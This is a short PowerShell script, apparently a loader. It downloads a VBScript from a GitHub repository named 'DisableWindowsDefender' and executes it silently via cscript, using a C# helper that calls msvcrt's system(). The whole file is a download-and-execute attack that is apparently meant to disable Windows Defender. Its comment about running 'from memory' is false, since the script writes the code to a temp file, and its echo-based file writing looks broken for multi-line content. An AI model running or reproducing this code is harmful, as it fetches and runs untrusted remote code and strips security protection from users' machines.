$url = "https://raw.githubusercontent.com/Raroford32/DisableWindowsDefender/Raroford32-patch-1/carl.vbs"
$vbsContent = Invoke-WebRequest -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content

# Define a function to run VBScript from memory
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class VBSExecutor
{
    [DllImport("msvcrt.dll", CharSet = CharSet.Ansi)]
    public static extern int system(string command);

    public static void Execute(string vbsCode)
    {
        string command = $"echo {vbsCode.Replace("\"", "\"\"")} > %temp%\\temp.vbs && cscript //B //NoLogo %temp%\\temp.vbs";
        system(command);
    }
}
"@

# Execute the VBScript content
[VBSExecutor]::Execute($vbsContent)
